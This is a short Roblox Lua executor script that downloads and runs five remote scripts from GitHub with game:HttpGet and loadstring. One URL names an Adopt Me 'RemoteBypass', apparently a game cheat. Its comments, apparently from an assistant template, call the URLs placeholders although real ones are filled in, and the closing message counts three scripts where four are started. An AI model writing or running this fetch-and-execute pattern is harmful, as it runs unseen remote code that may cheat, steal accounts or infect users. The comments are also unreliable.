wait(60)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(30)
--[[
  WARNING: For your safety, do not run scripts from untrusted sources.
  This example uses placeholder URLs. You are responsible for ensuring
  the safety of any code you choose to run.
--]]

-- Wait for 10 seconds as requested in your original script
wait(10)

-- Use spawn() to run each script in a separate thread.
-- This allows them to run at the same time without waiting for each other.

spawn(function()
  -- Using pcall (protected call) to catch any errors from the script
  -- without crashing the entire program.
  local success, err = pcall(function()
    -- Replace "YOUR_FIRST_SCRIPT_URL_HERE" with your actual URL
    local script_code = game:HttpGet("https://raw.githubusercontent.com/akagikay/far/refs/heads/main/buy")
    loadstring(script_code)()
  end)
  if not success then
    -- It's good practice to print errors for debugging purposes
    warn("Error in first script:", err)
  end
end)

spawn(function()
  local success, err = pcall(function()
    -- Replace "YOUR_SECOND_SCRIPT_URL_HERE" with your actual URL
    local script_code = game:HttpGet("https://raw.githubusercontent.com/akagikay/far/refs/heads/main/server")
    loadstring(script_code)()
  end)
  if not success then
    warn("Error in second script:", err)
  end
end)

spawn(function()
  local success, err = pcall(function()
    -- Replace "YOUR_THIRD_SCRIPT_URL_HERE" with your actual URL
    local script_code = game:HttpGet("https://raw.githubusercontent.com/akagikay/far/refs/heads/main/serenityhub")
    loadstring(script_code)()
  end)
  if not success then
    warn("Error in third script:", err)
  end
end)
spawn(function()
  local success, err = pcall(function()
    -- Replace "YOUR_FOURTH_SCRIPT_URL_HERE" with your actual URL
    local script_code = game:HttpGet("https://raw.githubusercontent.com/akagikay/far/refs/heads/main/checkalive")
    loadstring(script_code)()
  end)
  if not success then
    warn("Error in fourth script:", err)
  end
end)
print("All three scripts have been started concurrently.")
